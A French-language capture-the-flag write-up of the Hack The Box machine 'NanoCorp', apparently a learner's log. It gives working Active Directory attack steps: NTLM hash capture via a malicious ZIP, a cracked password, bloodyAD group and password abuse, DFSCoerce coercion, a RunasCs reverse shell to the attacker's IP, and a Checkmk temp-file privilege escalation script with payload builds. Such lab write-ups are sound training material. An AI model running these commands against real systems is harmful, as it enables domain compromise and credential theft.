@@ -1,0 +1,277 @@
+On commence comme d'hab avec nmap
+┌──(kali㉿kali)-[~]
+└─$ nmap -p- -sV 10.10.11.93 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 09:39 -0500
+Nmap scan report for 10.10.11.93
+Host is up (0.017s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+80/tcp    open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-01-05 21:42:26Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb, Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+5986/tcp  open  ssl/wsmans?
+9389/tcp  open  mc-nmf            .NET Message Framing
+49664/tcp open  msrpc             Microsoft Windows RPC
+49668/tcp open  msrpc             Microsoft Windows RPC
+52464/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+52476/tcp open  msrpc             Microsoft Windows RPC
+52494/tcp open  msrpc             Microsoft Windows RPC
+57953/tcp open  msrpc             Microsoft Windows RPC
+Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 213.39 seconds
+
+on va commencer par le site web
+
+la homepage contient un formulaire pour envoyer un message et un lien vers ce sous domaine http://hire.nanocorp.htb/
+
+Le sous domaine contiens un formulaire où je peux upload un zip qui sera analisé (surement ouvert) par le serv
+
+https://github.com/pacbypass/CVE-2025-11001
+hmmm il y a ce cve qui permet a un zip de s'extraire a un endroit prédéfinis => extraire une page reverse shell dans le directory du site. Mais 1 il faut que celui qui extrait soit admin, 2 que le dossier soit accessible par la personne qui va ouvrir le fichier 3 que je connaisse la path, 4 que ce soit un langage interprété du genre php
+
+pour le 4 je vois que c'est bien du php dans le header "PHP/8.2.12"
+le 1 et le 2 on peut pas savoir mais bon il faut bien tester
+il me reste domc qu'a trouver la path, je m'y connais pas trop en Windows ducoup je vais devoir chercher
+
+J'arrives pas avec cette piste donc je vais sur la chaine youtube qui donne des indices (PAS DES SOLUTIONS), et il dit qu'il faut récupérer un hash, donc je comprends que c'est un NTLM HASH et je recherche sur google "NTLM hash from ZIP extraction" et je tombes sur le CVE (CVE-2025-24054) qui date d'il y a pas si longtemps
+
+j'utilise ce POC
+
+je recois effectivement un hash sur responder
+
+
+[+] Listening for events...                                                                                                                                                                                                                 
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.93
+[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
+[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:44bfeb8bfb04df8d:A0119BB00B1860C4E3238E314BD77BE3:010100000000000000A955D3CA7FDC016FB785D0D47C8A30000000000200080032004E0036004B0001001E00570049004E002D003000560057004E005A0043003900550032004F00560004003400570049004E002D003000560057004E005A0043003900550032004F0056002E0032004E0036004B002E004C004F00430041004C000300140032004E0036004B002E004C004F00430041004C000500140032004E0036004B002E004C004F00430041004C000700080000A955D3CA7FDC0106000400020000000800300030000000000000000000000000200000116FB9CC333A67A139537EE80324FAF3EA8B96D4D62125CD0FECED1198F63B580A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370030000000000000000000                                                                                                                                                                                                                            
+[*] Skipping previously captured hash for NANOCORP\web_svc
+[*] Skipping previously captured hash for NANOCORP\web_svc
+[*] Skipping previously captured hash for NANOCORP\web_svc
+[*] Skipping previously captured hash for NANOCORP\web_svc
+[*] Skipping previously captured hash for NANOCORP\web_svc
+[*] Skipping previously captured hash for NANOCORP\web_svc
+
+avec hashcat je récupère ce password
+web_svc:dksehdgh712!@#
+
+J'ai access au ldap donc j'utilise ensuite bloodhound pour trouver un moyen d'aller plus loin:
+je trouves une path qui me permetterais d'avoir un utilisateur qui a accès au winrm (img: sc/path.jpg)
+
+1. web_svc peut s'ajouté (AddSelf) à IT_SUPPORT
+2. IT_SUPPORT peut changer le mdp de l'user monitoring_svc qui lui a accès au winrm
+
+1. bloodyAD -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' --dc-ip '10.10.11.93' add groupMember 'it_support' 'web_svc'
+2. bloodyAD -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' --dc-ip '10.10.11.93' set password 'monitoring_svc' 'Password123!'
+
+Ça fonctionne "password changed succesfully"
+
+je peux donc winrm
+
+bloodyAD -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' --dc-ip '10.10.11.93' add groupMember 'it_support' 'web_svc';
+bloodyAD -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' --dc-ip '10.10.11.93' set password 'monitoring_svc' 'Password123!';
+sudo ntpdate -bu nanocorp.htb;
+impacket-getTGT nanocorp.htb/'monitoring_svc':'Password123!';
+
+
+après casi UNE SEMAINE d'essais c'est bon j'en ai marre de bloquer sur un petit detail technique de merde comme ça je vais voir sur un walkthrough
+il utilise https://github.com/ozelis/winrmexec
+
+sudo ntpdate -bu nanocorp.htb
+KRB5CCNAME='../monitoring_svc.ccache' python3 ./evil_winrmexec.py nanocorp.htb/'monitoring_svc':'Password123!'@DC01.nanocorp.htb -ssl -k -no-pass
+
+ENFINNNNNNN, j'ai acces au foothold et a l'user flag dans le Desktop (img: sc/userflag.jpg)
+
+après un bout de temps sans solutions je retournes a la peche aux indices, et on me dit: "ntlm coercion"
+
+crackmapexec smb nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' -M dfscoerce
+SMB         nanocorp.htb    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
+SMB         nanocorp.htb    445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@# 
+DFSCOERC... nanocorp.htb    445    DC01             VULNERABLE
+DFSCOERC... nanocorp.htb    445    DC01             Next step: https://github.com/Wh04m1001/DFSCoerce
+
+je suis donc le github
+
+j'obtiens ça mais j'imagine que c'est impossible a cracker (que le DC n'a pas un mdp classique)
+[SMB] NTLMv2-SSP Client   : 10.10.11.93
+[SMB] NTLMv2-SSP Username : NANOCORP\DC01$
+[SMB] NTLMv2-SSP Hash     : DC01$::NANOCORP:c92d39f418b6ed48:C06176E7D4315FD1EB04D0445DF3BDE8:0101000000000000009160051E85DC01D92F25F6E7311BD80000000002000800570055004700430001001E00570049004E002D003000560049005900420055005900390032004400550004003400570049004E002D00300056004900590042005500590039003200440055002E0057005500470043002E004C004F00430041004C000300140057005500470043002E004C004F00430041004C000500140057005500470043002E004C004F00430041004C0007000800009160051E85DC01060004000200000008003000300000000000000000000000004000009B95D9F5687120B6D4BD663E078B41AC0A5C0C15803264CFD48B93F2C0F3156D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370030000000000000000000
+
+Je penses qu'il faut peut être faire ça:
+https://www.praetorian.com/blog/how-to-leverage-dfscoerce/
+
+utiliser ntlmrelayx.py pour relay le hash vers l'ADCS obtenir un certificat en tant que DC et creer un golden ticket
+mais pour ça il faut que ADCS Web Enrollment soit activé, ET JE CHERCHERAIS CA APRES MANGER tout laisse a penser que ça n'existe pas sur mon serveur
+
+en cherchant sur google "dfscoerce 2025" (parceque souvent c'est des CVE récents) je tombes sur un article 
+https://www.precedecyber.com/blog/cve-2025-33073-a-new-technique-for-reflective-ntlm-relay-attack
+( + de détails : https://forestall.io/blog/en/active-directory/cve-2025-33073-a-new-technique-for-reflective-ntlm-relay-attack/
+https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
+En gros pour executer ce cve
+1. il me faut ajouter un record au dns (donc avoir les droits)
+2. que le "SMB Signing is not enforced"
+3. et que des techniques de coercion comme DFSCoerce fonctionnent
+
+la 3 est valide (vu précedemment), la 1 surement aussi par défaut, mais la 2 enum4linux-ng me dit "SMB signing required: true". j'arrive même pas a mettre le dns record (insuficients rights)
+
+Bon il faut trouver autre chose, j'ai beau essayer tout j'ai l'impression que cette voie a été fix depuis le lancement de la machine et que l'indice est donc mauvais, en voyant d'autres walkthrough ils utilisent tous cette strat qui marche pour eux, au moins je suis content d'être arrivé a cette strat qui aurait pu marcher fût un temps (et j'ai enfin fix les problèmes de clock skew pour de bon)
+
+je suis désespéré et je vois dans un walkthrough un truc qui parle de checkMK, je vais pas voir la suite mais je vais explorer cette piste, d'abord en me demandant comment j'aurais pu le trouver
+
+j'aurais dû aller dans ProgramData
+PS C:\ProgramData\checkmk\agent> ls
+
+
+    Directory: C:\ProgramData\checkmk\agent
+
+
+Mode                 LastWriteTime         Length Name                                                                  
+----                 -------------         ------ ----                                                                  
+d-----          4/5/2025   4:17 PM                backup                                                                
+d-----          4/5/2025   4:17 PM                bakery                                                                
+d-----         1/15/2026   1:09 PM                bin                                                                   
+d-----          4/5/2025   4:17 PM                config                                                                
+d-----          4/5/2025   4:17 PM                install                                                               
+d-----          4/5/2025   4:17 PM                local                                                                 
+d-----          4/5/2025   3:03 PM                log                                                                   
+d-----          4/5/2025   4:17 PM                modules                                                               
+d-----          4/5/2025   4:17 PM                mrpe                                                                  
+d-----          4/5/2025   4:17 PM                plugins                                                               
+d-----          4/5/2025   4:17 PM                spool                                                                 
+d-----          4/5/2025   4:17 PM                state                                                                 
+d-----          4/5/2025   4:17 PM                tmp                                                                   
+d-----          4/5/2025   4:17 PM                update                                                                
+-a----          4/5/2025   3:03 PM             24 allow-legacy-pull                                                     
+-a----          6/7/2022   9:39 AM          16906 check_mk.user.example.yml                                             
+-a----          6/7/2022   9:39 AM          16906 check_mk.user.yml                                                     
+-a----         1/15/2026   1:09 PM            180 cmk-agent-ctl.toml                                                    
+-a----          4/5/2025   4:17 PM             24 controller-flag                                                       
+
+me rendre compte que checkmk est original
+
+PS C:\ProgramData\checkmk\agent> cd bin
+lPS C:\ProgramData\checkmk\agent\bin> ls
+
+
+    Directory: C:\ProgramData\checkmk\agent\bin
+
+
+Mode                 LastWriteTime         Length Name                                                                  
+----                 -------------         ------ ----                                                                  
+-a----         8/19/2022  10:11 AM        6902536 cmk-agent-ctl.exe                                                     
+
+
+PS C:\ProgramData\checkmk\agent\bin> ./cmk-agent-ctl.exe
+cmk-agent-ctl 2.1.0p10
+
+et ensuite voir sur internet qu'il y a un cve pour un privesc
+
+https://www.cvedetails.com/cve/CVE-2025-32919/
+"Use of an insecure temporary directory in the Windows License plugin for the Checkmk Windows Agent allows Privilege Escalation. This issue affects Checkmk: from 2.4.0 before 2.4.0p13, from 2.3.0 before 2.3.0p38, from 2.2.0 before 2.2.0p46, and all versions of 2.1.0 (EOL)."
+
+je peux écrire dans le dossier TEMP je peux donc modifier le fonctionnement du process
+
+https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/
+
+
+┌──(kali㉿kali)-[~/Documents/NanoCorp]
+└─$ msfvenom -p windows/exec CMD='cmd /c "whoami > C:\proof.txt"' -f exe -o mal.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 215 bytes
+Final size of exe file: 7168 bytes
+Saved as: mal.exe
+
+PS C:\Users\monitoring_svc\Documents> !upload ../mal.exe
+uploading to C:\Users\monitoring_svc\AppData\Local\Temp\89ade73c9f5f2218.tmp
+moving from C:\Users\monitoring_svc\AppData\Local\Temp\89ade73c9f5f2218.tmp to mal.exe
+
+get process me montre que le PID le plus élevé est 6992 
+
+je remplis donc le temp de fichiers
+
+6992..30000 | foreach {
+	copy C:\Users\monitoring_svc\Documents\mal.exe C:\Windows\Temp\cmk_all_${_}_1.cmd;
+	Set-ItemProperty -path C:\Windows\Temp\cmk_all_${_}_1.cmd -name IsReadOnly -value $true;
+}
+
+PS C:\Windows\Installer> Select-String -Path ./1e6f2.msi -Pattern "checkmk" -SimpleMatch
+
+me montre le bon installer
+
+le probléme c'est que windows defender m'empeche d'executer l'exe
+
+je le compile moi même:
+
+// vulnerable.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    system("whoami > C:\\Windows\\Temp\\proof.txt");
+    return 0;
+}
+
+x86_64-w64-mingw32-gcc vuln.c -o challenge.exe
+
+PS C:\Users\monitoring_svc\Documents> !upload ../challenge.exe
+uploading to C:\Users\monitoring_svc\AppData\Local\Temp\a91eaf7373b7dada.tmp
+moving from C:\Users\monitoring_svc\AppData\Local\Temp\a91eaf7373b7dada.tmp to challenge.exe
+PS C:\Users\monitoring_svc\Documents> ./challenge.exe
+PS C:\Users\monitoring_svc\Documents> cat C://Windows/TEMP/proof.txt
+nanocorp\monitoring_svc
+
+cette fois ci ça fonctionne
+
+je refais le script 
+
+7028..30000 | foreach {
+	copy C:\Users\monitoring_svc\Documents\challenge.exe C:\Windows\Temp\cmk_all_${_}_1.cmd;
+	Set-ItemProperty -path C:\Windows\Temp\cmk_all_${_}_1.cmd -name IsReadOnly -value $true;
+}
+
+msiexec /fa C:\Windows\Installer\1e6f2.msi /qn /l*vx C:\Windows\Temp\cmk_repair.log
+
+en me renseignant je me rends compte que ma supposition sur les PID est mauvaise (c'est pas forcement un nombre supérieur a ceux présents), je modifie donc mon script
+
+1000..10000 | foreach {
+	copy C:\Users\monitoring_svc\Documents\challenge.exe C:\Windows\Temp\cmk_all_${_}_1.cmd;
+	Set-ItemProperty -path C:\Windows\Temp\cmk_all_${_}_1.cmd -name IsReadOnly -value $true;
+}
+
+bon j'en ai marre je comprends pas je vais utiliser un exploit
+
+https://github.com/tralsesec/CVE-2024-0670
+je continue de galérer et je vois dans un repo "/qn /l*vx C:\Windows\Temp\cmk_repair.log" qui permet de log ça m'intéresse
+
+msiexec.exe /fa C:\Windows\Installer\1e6f2.msi /qn /l*vx C:\Windows\Temp\cmk_repair.log
+
+il y a rien et le seul moyen d'avoir qq'chose c'est de faire un runas web_svc et j'ai
+ Property(S): TempFolder = C:\Users\web_svc\AppData\Local\Temp\
+dans les longs logs
+
+PS C:\Users\monitoring_svc\Documents> ./RunasCs.exe 'web_svc' 'dksehdgh712!@#' cmd -r 10.10.14.117:9335
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-1cee2a3$\Default
+[+] Async process 'C:\Windows\system32\cmd.exe' with pid 3384 created in background.
+
+après encore des jours d'essais je retentes un vieux script mais cette fois ci je vois qu'il execute le ps1 avec des flags powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\exploit.ps1.
+Quand je lance ça avec l'user web_svc et les flags tout d'un coup ça fonctionne. Je penses donc que tout viens des flags (img: sc/root.jpg)
+
+Comme dit précedemment quand j'avais remarqué la variable d'environnement tmp qui pointait vers un autre dossier dans les logs, peut être que le NoProfile a empeché cela, je ne sais pas. En tout cas j'ai passé beauuuucoup de temps mais j'ai enfin finis mon premier "dificile"
+
+Conclusion:
+J'ai perdu pas mal de temps à trouver le premier CVE, mauvaise piste, j'aurais pu mieux le trouver avec plus d'experience sur windows à bien comprendre les différentes étapes, la deuxieme étape pour prendre le controle du compte avec acces winrm vraiment EZ je commence à bien maitriser ça, après j'ai aussi perdu un peu de temps sur la piste dfscoerce qui était un faux indice mais j'ai appris pas mal de choses donc je suis content. Pour la dernière piste j'aurais pas pu trouver sans l'indice du process à analiser, mais une fois que j'ai eu cet indice je suis assez content d'avoir réussi à trouver le bon cve et a forger moi même mon POC qui était identique à ceux proposés en ligne, j'ai ensuite malheureusement perdu trop de temps à ne pas connaitre les histoires de "NoProfile" "ExecutionPolicy bypass" qui me semblent être la clé de mes soucis. De manière générale je suis assez content d'avoir fait ma première box "Difficile", une box windows qui plus est, j'ai utilisé un peu trop d'indices à mon gout mais quand même heureux des efforts déployés
